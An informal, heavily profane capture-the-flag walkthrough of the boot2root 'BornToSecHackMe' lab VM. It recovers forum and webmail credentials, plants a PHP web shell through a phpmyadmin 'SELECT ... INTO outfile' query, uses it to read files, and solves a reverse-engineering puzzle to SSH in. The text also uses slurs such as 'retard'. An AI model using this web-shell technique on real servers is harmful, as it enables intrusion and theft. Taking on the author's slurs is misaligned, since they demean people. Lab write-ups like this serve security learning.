# boot2root
what the fuck am i doing

# this looks like an intro to privilege escalation
The subject states that we need to get user and root access to this bullshit

## getting the IP address
Since I dk where the fuck to start, I'm thinking I need to maybe nmap scan the machine but wtf is the fucking IP address

**vm in local network**, you idiot, so I need address of local network, then I remembered, there's usually an *interface* created by vbox
```
$ ifconfig
vboxnet0: flags=8842<BROADCAST,RUNNING,SIMPLEX,MULTICAST> mtu 1500
        ether 0a:00:27:00:00:00 
$ arp -a
? (10.11.100.38) at b8:27:eb:f7:8f:b2 on en0 ifscope [ethernet]
```
running a dirb, there's a /forum route and a /webmail and /phpmyadmin, after clicking and doing stupid shit, there s a link users that lists the users in the forum and their posts

user **lmezard** posted a login failure thread
```
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from
```
the stupid idiot entered the password in the login field, stupid fuck

using **lmezard:!q\]Ej?*5K5cy*AJ** it logs in to the forum, and it woooorks, ouh email **laurie@borntosec.net**

I'm suspecting its a webmail email and the retard uses the same password

HE DOES OR SHE, THEY whatever

found an email theeere 	**DB Access**
```
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```
retard, used the root password to connect to phpmyadmin

*fucking hell wtf*, there s a forum_db, with a **mlf2_userdata** table with usernames and of course *encrypted* passwords, kill me

after googling how to execute command from phpmyadmin blah blah

found **https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/**, abt a phpmyadmin tkhwira
```
SELECT "<?php exec($_GET['cmd']);?>" INTO outfile '/var/www/forum/templates_c/khra.php'
Votre requête SQL a été exécutée avec succès ( Traitement en 0.0001 sec )

https://10.11.100.75/forum/templates_c/ikhane.php?cmd=whoami
www-data
```

fucking useless
```
https://10.11.100.75/forum/templates_c/ikhane.php?cmd=ls%20-al%20/home
total 0 drwxrwx--x 1 www-data root 60 Oct 13 2015 . drwxr-xr-x 1 root root 220 Jan 28 15:35 .. drwxr-x--- 2 www-data www-data 31 Oct 8 2015 LOOKATME drwxr-x--- 6 ft_root ft_root 156 Jun 17 2017 ft_root drwxr-x--- 3 laurie laurie 143 Oct 15 2015 laurie drwxr-x--- 1 laurie@borntosec.net laurie@borntosec.net 60 Oct 15 2015 laurie@borntosec.net dr-xr-x--- 2 lmezard lmezard 61 Oct 15 2015 lmezard drwxr-x--- 3 thor thor 129 Oct 15 2015 thor drwxr-x--- 4 zaz zaz 147 Oct 15 2015 zaz
```
**LOOKATME** directoryyyy
```
https://10.11.100.75/forum/templates_c/ikhane.php?cmd=ls%20-al%20/home/LOOKATME
total 1 drwxr-x--- 2 www-data www-data 31 Oct 8 2015 . drwxrwx--x 1 www-data root 60 Oct 13 2015 .. -rwxr-x--- 1 www-data www-data 25 Oct 8 2015 password
```
WTFFFF, 
```
https://10.11.100.75/forum/templates_c/ikhane.php?cmd=cat%20/home/LOOKATME/password
lmezard:G!@M6f4Eatau{sF"
```
tried ssh into the machine
```
$ ssh lmezard@10.11.100.75
lmezard@10.11.100.75's password:G!@M6f4Eatau{sF"
Permission denied, please try again.
```
nope, kill me, after several fucking attempts to ssh using user lmezard

Tried to login directly into machine without ssh,, and it logged in

```
$ whoami
lmezard
```
in working directory, there's 2 files, README and fun

the README tells us to complete the challenge and use the result to ssh using laurie user, ugh kill me

```
$ file fun
fun: POSIX tar archive (GNU)
```
trying to untar it didnt work, cat ing it dhows a few printfs, so i saved it into a file and grep the fuck out of it 
```
int main() { printf("M"); printf("Y"); printf(" "); printf("P"); printf("A"); printf("S"); printf("S"); printf("W"); printf("O"); printf("R"); printf("D");
printf(" "); printf("I"); printf("S"); printf(":"); printf(" "); printf("%c",getme1()); printf("%c",getme2()); printf("%c",getme3());
printf("%c",getme4()); printf("%c",getme5()); printf("%c",getme6()); printf("%c",getme7()); printf("%c",getme8()); printf("%c",getme9());
printf("%c",getme10()); printf("%c",getme11()); printf("%c",getme12()); printf("\n"); printf("Now SHA-256 it and submit");
```
niiice
```
char getme8() { return 'w'; }
char getme9() { return 'n'; }

char getme10() { return 'a'; }
char getme11() { return 'g'; }

char getme12() { return 'e'; } 
```
there's only theeeese, then random returns, so I wanna use a script to print all possible strings that can be made from the chars **hpeaIrtwnage**
tried to generate distinct combinations from a list of those characters, stupid idea

The password ends with **wnage**, then we're left with **hearptI**, so after stupid tries, it's **Iheartpwnage**, its SHA-256

**330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4**
```
$ ssh laurie@10.11.100.75
laurie@10.11.100.75's password:330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
laurie@BornToSecHackMe:~$ whoami
laurie
```


